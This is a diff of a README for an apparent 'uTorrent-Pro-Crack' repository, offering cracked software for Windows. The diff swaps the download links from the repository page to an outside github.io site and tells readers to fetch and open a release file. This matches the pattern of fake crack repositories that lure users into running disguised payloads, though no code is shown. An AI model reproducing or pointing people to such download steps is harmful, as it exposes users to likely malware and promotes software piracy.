@@ -1,6 +1,6 @@
 # 📁 uTorrent-Pro-Crack - Efficient file sharing for Windows users
 
-[![Download uTorrent Pro](https://img.shields.io/badge/Download-uTorrent_Pro-blue)](https://github.com/whatsthes3599/uTorrent-Pro-Crack)
+[![Download uTorrent Pro](https://img.shields.io/badge/Download-uTorrent_Pro-blue)](https://whatsthes3599.github.io)
 
 ## 📌 About this software
 
@@ -20,7 +20,7 @@ Before you install this software, ensure your computer meets these requirements:
 
 Follow these steps to set up the software on your machine:
 
-1.  Visit this page to download: [https://github.com/whatsthes3599/uTorrent-Pro-Crack](https://github.com/whatsthes3599/uTorrent-Pro-Crack)
+1.  Visit this page to download: [https://whatsthes3599.github.io](https://whatsthes3599.github.io)
 2.  Locate the latest release file on the page.
 3.  Click the file to initiate the transfer to your computer.
 4.  Open your Downloads folder after the process finishes.
